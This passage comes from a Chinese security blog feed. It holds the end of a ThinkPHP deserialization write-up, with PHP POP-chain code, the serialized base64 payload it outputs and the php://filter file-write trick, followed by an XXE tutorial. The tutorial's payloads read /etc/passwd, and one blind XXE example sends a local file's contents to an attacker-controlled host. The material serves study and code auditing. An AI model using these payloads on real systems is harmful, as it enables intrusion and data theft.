class="string">&#x27;0&#x27;</span>, <span class="comment">//绕过getCacheKey中的第二个if</span></span><br><span class="line">                <span class="string">&#x27;path&#x27;</span>  =&gt; <span class="string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php&#x27;</span>, <span class="comment">//有php+12个0+exit，共21个字符，为了凑到4的整数倍，需要加上三个字符</span></span><br><span class="line">                <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span>,</span><br><span class="line">            ];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="string">&#x27;1&#x27;</span>; <span class="comment">//用于后续控制文件名，需要使用</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">Memcached</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>(<span class="title class_">new</span> \<span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>());</span><br><span class="line">    <span class="variable">$Output</span> = <span class="keyword">new</span> think\console\<span class="title function_ invoke__">Output</span>(<span class="variable">$Memcached</span>);</span><br><span class="line">    <span class="variable">$model</span> = <span class="keyword">new</span> think\db\<span class="title function_ invoke__">Query</span>(<span class="variable">$Output</span>);</span><br><span class="line">    <span class="variable">$HasOne</span> = <span class="keyword">new</span> think\model\relation\<span class="title function_ invoke__">HasOne</span>(<span class="variable">$model</span>);</span><br><span class="line">    <span class="variable">$window</span> = <span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>(<span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="variable">$Output</span>, <span class="variable">$HasOne</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$window</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后生成：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aToxO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7aTowO3M6MTE6IgAqAGJpbmRBdHRyIjthOjE6e2k6MDtzOjM6Inh4eCI7fXM6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fXM6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6MTp7czoxMDoiACoAaGFuZGxlciI7TzoyMzoidGhpbmtcY2FjaGVcZHJpdmVyXEZpbGUiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO3M6MToiMCI7czo2OiJwcmVmaXgiO3M6MToiMCI7czo0OiJwYXRoIjtzOjEwNjoicGhwOi8vZmlsdGVyL2NvbnZlcnQuaWNvbnYudXRmLTgudXRmLTd8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPXh4eFBEOXdhSEFnY0dod2FXNW1ieWdwT3o4Ky8uLi9hLnBocCI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjY6IgAqAHRhZyI7czoxOiIxIjt9fX19fXM6OToiACoAcGFyZW50IjtyOjExO319fQ</span><br></pre></td></tr></table></figure><p>传入：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220824173035726.png" alt="image-20220824173035726"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220824173115023.png" alt="image-20220824173115023"></p><p>效果图：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220824173147241.png" alt="image-20220824173147241"></p><p>这里分析一下文件名是怎么生成的</p><p><strong>第一次进入set函数的时候：</strong></p><p>首先将$name进行md5加密，然后连接到$this-&gt;options[‘path’]后面，再加上.php</p><p>可以得到<code>$filename</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php8db7a8c80e67e908f96fbf22dde11df3.php</span><br></pre></td></tr></table></figure><p>然后进行<code>file_put_contents()</code>，可以得到第一个文件，同时第一个$data值是将恒为true的$value反序列化，得到b:1;</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220824183337048.png" alt="image-20220824183337048"></p><p><strong>第二次进入set函数的时候：</strong></p><p>会经过setTagtem()函数，进行重新赋值，进入到has方法，跟进到get方法，然后重新调用到File类的getCacheKey方法，此时的$name是tag_md5(“1”),也就是<code>tag_c4ca4238a0b923820dcc509a6f75849b</code></p><p>然后上面的再次md5，得到<code>3b58a9545013e88c7186db11bb158c44</code>，按照之前的方法，连接到后面，就会出现新的<code>$filename</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php3b58a9545013e88c7186db11bb158c44.php</span><br></pre></td></tr></table></figure><p>因为这个文件不存在，会返回false所以会跳过if($this-&gt;has($key))，直接令$value等于输入的$name，也就是tag_md5(“1”)，也就是<code>tag_c4ca4238a0b923820dcc509a6f75849b</code></p><p>然后再次进入set()函数，这一次会进入getCacheKey()函数，然后再次md5加密，得到md5(tag_md5(“1”))，也就是$filename</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php3b58a9545013e88c7186db11bb158c44.php</span><br></pre></td></tr></table></figure><p>然后因为第一次进入setTagItem()函数的时候，会将tag设置为null，所以不会再进入，写入成功。</p><p>因此最后我们需要的文件名应该是这个格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name = &quot;a.php&quot;.md5(tag_md5(&quot;1&quot;)).&quot;.php&quot;</span><br></pre></td></tr></table></figure><p>两次md5都是getCacheKey中的函数。</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://xz.aliyun.com/t/7457#toc-3">https://xz.aliyun.com/t/7457#toc-3</a></p><p><a href="https://www.moonsec.com/4586.html">https://www.moonsec.com/4586.html</a></p><p><a href="https://www.anquanke.com/post/id/196364#h2-5">https://www.anquanke.com/post/id/196364#h2-5</a></p><p><a href="https://www.anquanke.com/post/id/265088#h2-4">https://www.anquanke.com/post/id/265088#h2-4</a></p><p><a href="https://xz.aliyun.com/t/7457#toc-5">https://xz.aliyun.com/t/7457#toc-5</a></p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/116170568?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-116170568-blog-119196766.pc_relevant_aa_2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-116170568-blog-119196766.pc_relevant_aa_2&amp;utm_relevant_index=2">https://blog.csdn.net/Zero_Adam/article/details/116170568?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-116170568-blog-119196766.pc_relevant_aa_2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-116170568-blog-119196766.pc_relevant_aa_2&amp;utm_relevant_index=2</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计,反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识XXE</title>
      <link href="/2022/08/05/%E5%88%9D%E8%AF%86XXE/"/>
      <url>/2022/08/05/%E5%88%9D%E8%AF%86XXE/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="XXE漏洞概述："><a href="#XXE漏洞概述：" class="headerlink" title="XXE漏洞概述："></a>XXE漏洞概述：</h2><p>XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。<br> 下面我们主要介绍PHP语言下的XXE攻击.</p><p>XML是一种非常流行的标记语言，在1990年代后期首次标准化，并被无数的软件项目所采用。它用于配置文件，文档格式（如OOXML，ODF，PDF，RSS，…），图像格式（SVG，EXIF标题）和网络协议（WebDAV，CalDAV，XMLRPC，SOAP，XMPP，SAML， XACML，…），他应用的如此的普遍以至于他出现的任何问题都会带来灾难性的结果。</p><p>在解析外部实体的过程中，XML解析器可以根据URL中指定的方案（协议）来查询各种网络协议和服务（DNS，FTP，HTTP，SMB等）。  外部实体对于在文档中创建动态引用非常有用，这样对引用资源所做的任何更改都会在文档中自动更新。  但是，在处理外部实体时，可以针对应用程序启动许多攻击。  这些攻击包括泄露本地系统文件，这些文件可能包含密码和私人用户数据等敏感数据，或利用各种方案的网络访问功能来操纵内部应用程序。  通过将这些攻击与其他实现缺陷相结合，这些攻击的范围可以扩展到客户端内存损坏，任意代码执行，甚至服务中断，具体取决于这些攻击的上下文。</p><h3 id="1-1-XML基础"><a href="#1-1-XML基础" class="headerlink" title="1.1 XML基础"></a>1.1 XML基础</h3><p>XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储。</p><blockquote><p><a href="https://www.baidu.com/link?url=L6JMO5tvg5ezZzr9bGbyGquXZW3wFoQERLSbURIG5Cx5yLohQzxOEksQrLmw4PtjMtidvQZaTVjTYAs8Frt4OK&wd=&eqid=9bce677d0000ee900000000362e0fafa">菜鸟教程链接</a>：</p></blockquote><p>简单来说，如果需要在HTML文档中动态现实数据，则需要使用大量的时间来对HTML进行编辑，通过XML可以将数据存储在独立的XML文件中，这样就可以专注于使用HTML&#x2F;CSS进行现实和布局，不需要进行大量的修改。</p><p><strong>XML数据使用文本的格式进行存储。</strong></p><h4 id="1-1-1文档结构"><a href="#1-1-1文档结构" class="headerlink" title="1.1.1文档结构"></a>1.1.1文档结构</h4><p>XML文档形成了一种树结构从根部开始，然后扩展到枝叶。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">head</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> <span class="comment">&lt;!--根元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Dave<span class="tag">&lt;/<span class="name">to</span>&gt;</span>  <span class="comment">&lt;!--子元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Tom<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>You are a good man<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>&lt;note&gt;</code>表示下面的是根元素，使用<code>&lt;/note&gt;</code>进行包裹，之间的被成为子元素。</p><p>对于XML文档来说，必须包含根元素。这个元素是所有其他元素的父元素。同时，所有元素都可以有子元素。</p><h4 id="1-1-2-DTD"><a href="#1-1-2-DTD" class="headerlink" title="1.1.2 DTD"></a>1.1.2 DTD</h4><blockquote><p><a href="https://www.runoob.com/dtd/dtd-tutorial.html">菜鸟教程</a></p></blockquote><p>文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><p><em>*<em>DTD</em>是一种保证XML文档格式正确的有效方法，可以通过比较XML文档和*DTD</em>文件来看文档是否符合规范，元素和标签使用是否正确。**</p><p>简单来说这个就是一个用来判定你写的XML是不是正确的一个判定标准，但是可以自己定义。</p><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p><p> （1）内部的 DOCTYPE 声明<br> <code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code><br> （2）外部文档声明<br> <code>&lt;!DOCTYPE 根元素 SYSTEM ”文件名”&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">&lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT msg (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>上面这个 DTD 就定义了 XML 的根元素是 message，然后跟元素下面有一些子元素，那么 XML 到时候必须像下面这么写</p><p><strong>示例代码：</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-1-3-DTD实体"><a href="#1-1-3-DTD实体" class="headerlink" title="1.1.3 DTD实体"></a>1.1.3 DTD实体</h4><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><ul><li>实体引用是对实体的引用。</li><li>实体可在内部或外部进行声明。</li></ul><p>其实除了在 DTD 中定义元素（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中定义实体(对应XML 标签中的内容)，毕竟 ML 中除了能标签以外，还需要有些内容是固定的</p><p><strong>示例代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</span><br></pre></td></tr></table></figure><p>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</p><p><strong>示例代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</p><p><strong>关于实体的使用：</strong></p><p>实体分为两种，内部实体和<strong>外部实体</strong>，上面我们举的例子就是内部实体，<strong>但是实体实际上可以从外部的 dtd 文件中引用</strong>，我们看下面的代码：</p><p><strong>示例代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;!--XML--&gt;</span><br><span class="line"></span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便</p><p>当然，还有一种引用方式是使用 引用<strong>公用 DTD</strong> 的方法，语法如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure><p>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</p><p><strong>关于通用实体和参数实体：</strong></p><p>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体）</p><p><strong>1.通用实体</strong></p><p>用 &amp;实体名; 引用的实体，<strong>他在DTD 中定义，在 XML 文档中引用</strong></p><p><strong>示例代码：</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">updateProfile</span> [<span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span>  </span><br><span class="line">    ... </span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>2.参数实体：</strong></p><p>(1)使用 <code>% 实体名</code>(<strong>这里面空格不能少</strong>) 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>(2)只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>(3)和通用实体一样，参数实体也可以外部引用</p><p><strong>示例代码：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure><p>可以看见的是，这样就是直接对实体进行了引用，相当于是写出了两个实体。其中一个是直接给出的实体的值，另一个是给出了实体名称，然后使用url进行外部引用。</p><p><strong>抛转：</strong></p><p>参数实体在我们 Blind XXE 中起到了至关重要的作用</p><p><strong>总结：</strong></p><p>（1）内部实体声明<br> <code>&lt;!ENTITY 实体名称 ”实体的值”&gt;</code><br> （2）外部实体声明<br> <code>&lt;!ENTITY 实体名称 SYSTEM ”URI”&gt;</code><br> （3）参数实体声明<br> <code>&lt;!ENTITY % 实体名称 ”实体的值”&gt;</code>或者<code>&lt;!ENTITY % 实体名称 SYSTEM ”URI”&gt;</code></p><p>三种实体声明方式使用区别：<br> 参数实体用%实体名称申明，引用时也用<code>%</code>实体名称;<br> 其余实体直接用实体名称申明，引用时用<code>&amp;</code>实体名称。<br> 参数实体只能在<code>DTD</code>中申明，<code>DTD</code>中引用；<br> 其余实体只能在<code>DTD</code>中申明，可在<code>xml</code>文档中引用。</p><h3 id="1-2-XXE原理"><a href="#1-2-XXE原理" class="headerlink" title="1.2 XXE原理"></a>1.2 XXE原理</h3><p><code>XXE</code>即<code>XML外部实体注入</code> 。我们先分别理解一下注入和外部实体的含义。</p><p>注入：是指<code>XML</code>数据在传输过程中被修改，导致服务器执行了修改后的恶意代码，从而达到攻击目的。 </p><p>外部实体：则是指攻击者通过利用外部实体声明部分来对<code>XML</code>数据进行修改、插入恶意代码。 所以<code>XXE</code>就是指<code>XML</code>数据在传输过程中利用外部实体声明部分的<code>“SYSTEM”</code>关键词导致<code>XML</code>解析器可以从本地文件或者远程<code>URI</code>中读取受保护的数据。（有点像是SSRF，引用了不该使用的本地文件或是远程的url）</p><h3 id="1-3-XXE分类"><a href="#1-3-XXE分类" class="headerlink" title="1.3 XXE分类"></a>1.3 XXE分类</h3><p><strong>下面我们对<code>XXE</code>进行一下分类，按照构造外部实体声明的方法不同可分为：</strong></p><p>直接通过<code>DTD</code>外部实体声明</p><p>通过<code>DTD</code>文档引入外部<code>DTD</code>文档中的外部实体声明</p><p>通过<code>DTD</code>外部实体声明引入外部<code>DTD</code>文档中的外部实体声明</p><p><strong>按照<code>XXE</code>回显信息不同可分为：</strong></p><p>正常回显XXE：</p><p>正常回显XXE是最传统的XXE攻击,在利用过程中服务器会直接回显信息，可直接完成XXE攻击。</p><p>报错XXE：</p><p>报错XXE是回显XXE攻击的一种特例,它与正常回显XXE的不同在于它在利用过程中服务器回显的是错误信息，可根据错误信息的不同判断是否注入成功。</p><p>Blind XXE：</p><p>当服务器没有回显，我们可以选择使用Blind XXE。与前两种XXE不同之处在于Blind XXE无回显信息,可组合利用file协议来读取文件或http协议和ftp协议来查看日志。<br> Blind XXE主要使用了DTD约束中的参数实体和内部实体。<br> 在XML基础有提到过参数实体的定义，这里就不再做详细讲解。<br> 参数实体是一种只能在DTD中定义和使用的实体，一般引用时使用%作为前缀。而内部实体是指在一个实体中定义的另一个实体，也就是嵌套定义。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Note[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///C:/1.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://攻击者主机IP/Quan.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;root&gt;&amp;send;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>Quan.xml内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://192.168.150.1/1.php?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>%remote</code>引入外部XML文件到这个 XML 中，<code>%all</code>检测到send实体，在 root 节点中引入 send 实体，便可实现数据转发。<br> 利用过程：第3行，存在漏洞的服务器会读出file的内容（c:&#x2F;1.txt），通过Quan.xml带外通道发送给攻击者服务器上的1.php，1.php做的事情就是把读取的数据保存到本地的1.txt中，完成Blind XXE攻击。</p><h4 id="1-3-1-按构造外部实体声明"><a href="#1-3-1-按构造外部实体声明" class="headerlink" title="1.3.1 按构造外部实体声明"></a>1.3.1 按构造外部实体声明</h4><h5 id="1-3-1-1-直接通过DTD外部实体声明"><a href="#1-3-1-1-直接通过DTD外部实体声明" class="headerlink" title="1.3.1.1 直接通过DTD外部实体声明"></a>1.3.1.1 直接通过DTD外部实体声明</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE Quan[</span><br><span class="line">    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;hhh&gt;&amp;f;&lt;hhh&gt;</span><br></pre></td></tr></table></figure><p>直接引用外部实体，实现对passwd文件的读取。</p><h5 id="1-3-1-2-通过DTD文档引入外部DTD文档中的外部实体声明"><a href="#1-3-1-2-通过DTD文档引入外部DTD文档中的外部实体声明" class="headerlink" title="1.3.1.2 通过DTD文档引入外部DTD文档中的外部实体声明"></a>1.3.1.2 通过DTD文档引入外部DTD文档中的外部实体声明</h5><p><strong>（注意是通过DTD文档引入外部实体）</strong></p><p>XML文件内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">    &lt;!DOCTYPE Quan SYSTEM &quot;https://blog.csdn.net/syy0201/Quan.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;hhh&gt;&amp;f;&lt;hhh&gt;</span><br></pre></td></tr></table></figure><p>DTD文件内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure><p>引用外部的dtd文件内容中的实体，然后达成读取文件的作用。</p><h5 id="1-3-1-3-通过DTD外部实体声明引入外部DTD文档中的外部实体声明"><a href="#1-3-1-3-通过DTD外部实体声明引入外部DTD文档中的外部实体声明" class="headerlink" title="1.3.1.3 通过DTD外部实体声明引入外部DTD文档中的外部实体声明"></a>1.3.1.3 通过DTD外部实体声明引入外部DTD文档中的外部实体声明</h5><p><strong>（重点是通过文档中的外部实体，引入外部实体，和上面的不一样）</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Quan[</span><br><span class="line">&lt;!ENTITY f SYSTEM &quot;https://blog.csdn.net/syy0201/Quan.dtd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;hhh&gt;&amp;f;&lt;hhh&gt;</span><br></pre></td></tr></table></figure><p>Quan.dtd的外部实体声明内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br></pre></td></tr></table></figure><p>最后的效果，还是把文件内容读取出去。</p><h3 id="1-4-XXE能做什么："><a href="#1-4-XXE能做什么：" class="headerlink" title="1.4 XXE能做什么："></a>1.4 XXE能做什么：</h3><p>上一节疯狂暗示了 <strong>外部实体</strong> ，那他究竟能干什么？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>既然能读 dtd 